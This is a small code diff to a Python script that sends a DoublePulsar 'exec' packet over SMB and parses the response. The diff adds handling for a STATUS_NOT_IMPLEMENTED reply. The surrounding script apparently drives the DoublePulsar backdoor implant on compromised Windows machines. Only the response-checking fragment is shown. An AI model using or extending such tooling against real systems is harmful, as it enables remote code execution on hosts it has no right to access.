@@ -413,6 +413,9 @@ if __name__ == "__main__":
         s.send(doublepulsar_exec_packet)
         smb_response = s.recv(1024)
 
+        if smb_response[9] == 0x02 and smb_response[10] == 0x00 and smb_response[11] == 0x00 and smb_response[12] == 0xc0:
+            print("DoublePulsar returned: 0xC0000002 - STATUS_NOT_IMPLEMENTED!")
+                    
         # 0x52
         if smb_response[34] == 82:
             print("Doublepulsar returned:  Success!\n")
